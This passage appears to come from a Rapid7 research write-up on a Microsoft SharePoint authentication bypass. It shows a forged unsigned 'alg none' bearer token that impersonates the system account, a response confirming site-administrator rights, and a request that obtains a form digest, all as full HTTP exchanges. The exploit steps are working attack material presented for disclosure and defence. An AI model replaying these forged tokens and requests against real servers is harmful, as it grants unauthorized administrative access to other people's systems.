Authorization: Bearer eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJhdWQiOiAiMDAwMDAwMDMtMDAwMC0wZmYxLWNlMDAtMDAwMDAwMDAwMDAwL3dpbi1iMGk2a3Y2OThsc0BhZjkwY2MwMy00YTI2LTQ1ZTktOTA2YS02MDljZWJjZWJiZGUiLCAiaXNzIjogIjAwMDAwMDAzLTAwMDAtMGZmMS1jZTAwLTAwMDAwMDAwMDAwMEBhZjkwY2MwMy00YTI2LTQ1ZTktOTA2YS02MDljZWJjZWJiZGUiLCAibmJmIjogMTc3Njc2NTY3MiwgImV4cCI6IDE3NzY3Njk1NzIsICJuYW1laWQiOiAiUy0xLTUtMjEtNDIwMzg4ODE1OC0yNzkzNTM2NDUwLTM5MjE2NzUyOTgtNTAwIiwgIm5paSI6ICJ1cm46b2ZmaWNlOmlkcDphY3RpdmVkaXJlY3RvcnkiLCAidHJ1c3RlZGZvcmRlbGVnYXRpb24iOiAidHJ1ZSIsICJhY3RvcnRva2VuIjogImV5SmhiR2NpT2lBaVVsTXlOVFlpTENBaWRIbHdJam9nSWtwWFZDSXNJQ0o0TlhRaU9pQWlhVjluZWpWeFpsbHdOVmxRVjBGTE1WOWZNRmxvV201cGNFeEpJbjAuZXlKcGMzTWlPaUFpTURBd01EQXdNRE10TURBd01DMHdabVl4TFdObE1EQXRNREF3TURBd01EQXdNREF3UUdGbU9UQmpZekF6TFRSaE1qWXRORFZsT1MwNU1EWmhMVFl3T1dObFltTmxZbUprWlNJc0lDSnVZVzFsYVdRaU9pQWlNREF3TURBd01ETXRNREF3TUMwd1ptWXhMV05sTURBdE1EQXdNREF3TURBd01EQXdRR0ZtT1RCall6QXpMVFJoTWpZdE5EVmxPUzA1TURaaExUWXdPV05sWW1ObFltSmtaU0lzSUNKdVltWWlPaUF4TnpjMk56WTFOamN5TENBaVpYaHdJam9nTVRjM05qYzJPVFUzTW4wLkFBQUEifQ.
Accept: application/json;odata=verbose


```


The following response shows this has worked, and the user we identified as is in fact a SharePoint site administrator (The returned


IsSiteAdmin


value is


true


).


```text
HTTP/1.1 200 OK
Cache-Control: private, max-age=0
Transfer-Encoding: chunked
Content-Type: application/json;odata=verbose;charset=utf-8
Expires: Mon, 06 Apr 2026 10:06:12 GMT
Last-Modified: Tue, 21 Apr 2026 10:06:12 GMT
Server: Microsoft-IIS/10.0
X-SharePointHealthScore: 0
X-SP-SERVERSTATE: ReadOnly=0
DATASERVICEVERSION: 3.0
SPClientServiceRequestDuration: 12
SPRequestDuration: 83
X-AspNet-Version: 4.0.30319
SPRequestGuid: e01a0ca2-0b92-e0bd-6d28-7b843e6bda5c
request-id: e01a0ca2-0b92-e0bd-6d28-7b843e6bda5c
X-FRAME-OPTIONS: SAMEORIGIN
X-Powered-By: ASP.NET
MicrosoftSharePointTeamServices: 16.0.0.19725
X-Content-Type-Options: nosniff
X-MS-InvokeApp: 1; RequireReadOnly
Date: Tue, 21 Apr 2026 10:06:12 GMT


{"d":{"__metadata":{"id":"https://win-b0i6kv698ls/_api/Web/GetUserById(1073741823)","uri":"https://win-b0i6kv698ls/_api/Web/GetUserById(1073741823)","type":"SP.User"},"Alerts":{"__deferred":{"uri":"https://win-b0i6kv698ls/_api/Web/GetUserById(1073741823)/Alerts"}},"Groups":{"__deferred":{"uri":"https://win-b0i6kv698ls/_api/Web/GetUserById(1073741823)/Groups"}},"Id":1073741823,"IsHiddenInUI":false,"LoginName":"SHAREPOINT\\system","Title":"System Account","PrincipalType":1,"Email":"","IsEmailAuthenticationGuestUser":false,"IsShareByEmailGuestUser":false,"IsSiteAdmin":true,"UserId":{"__metadata":{"type":"SP.UserIdInfo"},"NameId":"S-1-0-0","NameIdIssuer":"urn:office:idp:activedirectory"}}}
```


To begin to interact with the target SharePoint site as this user we can acquire a new form digest value via a POST request to the


/_api/contextinfo


endpoint.


```text
POST /_api/contextinfo HTTP/1.1
Host: win-b0i6kv698ls
User-Agent: curl/7.81.0
Accept: application/json
Content-Length: 0


```


Whose response contains a new


FormDigestValue


we can begin to use.


```text
HTTP/1.1 200 OK
Cache-Control: private, max-age=0
Transfer-Encoding: chunked
Content-Type: application/json;odata=minimalmetadata;streaming=true;charset=utf-8
Expires: Mon, 06 Apr 2026 10:06:12 GMT
Last-Modified: Tue, 21 Apr 2026 10:06:12 GMT
Server: Microsoft-IIS/10.0
X-SharePointHealthScore: 0
X-SP-SERVERSTATE: ReadOnly=0
DATASERVICEVERSION: 3.0
SPClientServiceRequestDuration: 4
SPRequestDuration: 17
X-AspNet-Version: 4.0.30319
SPRequestGuid: e01a0ca2-db97-e0bd-6d28-795e9bdf7bdb
request-id: e01a0ca2-db97-e0bd-6d28-795e9bdf7bdb
X-FRAME-OPTIONS: SAMEORIGIN
X-Powered-By: ASP.NET
MicrosoftSharePointTeamServices: 16.0.0.19725
X-Content-Type-Options: nosniff
X-MS-InvokeApp: 1; RequireReadOnly
Date: Tue, 21 Apr 2026 10:06:12 GMT


{"odata.metadata":"https://win-b0i6kv698ls/_api/$metadata#SP.ContextWebInformation","FormDigestTimeoutSeconds":1800,"FormDigestValue":"0x08350AA4E26C638120137515168806E0389312ED89151357A505BA8F1F7B4992AAAF9A15D4DD3D5E43ACADE857B5AE5BFFCA753401F5E5A0C3EB6F483E4188E2,21 Apr 2026 10:06:12 -0000","LibraryVersion":"16.0.19725.20210","SiteFullUrl":"https://win-b0i6kv698ls","SupportedSchemaVersions":["14.0.0.0","15.0.0.0"],"WebFullUrl":"https://win-b0i6kv698ls"}
```


With authentication bypassed, and with a valid form digest, the remote attacker can begin to interact with the authenticated attack surface of the target SharePoint site.


## Upcoming webinar


Interested in the AI tooling leveraged throughout the research process? Join Rapid7's Stephen Fewer and Douglas McKee on Thursday, August 13 to walk through the full exploit chain, actionable next steps and more.[Register here](https://www.brighttalk.com/webcast/10457/673829?utm_source=Rapid7&utm_medium=brighttalk&utm_medium=organic-social&utm_campaign=673829%3Futm_source%3Dlinkedin&utm_campaign=global-mdr-q3-2026-global-webinar-prospect-eng-etos-25&utm_content=microsoft-sharepoint-webinar&utm_term=touch1) .
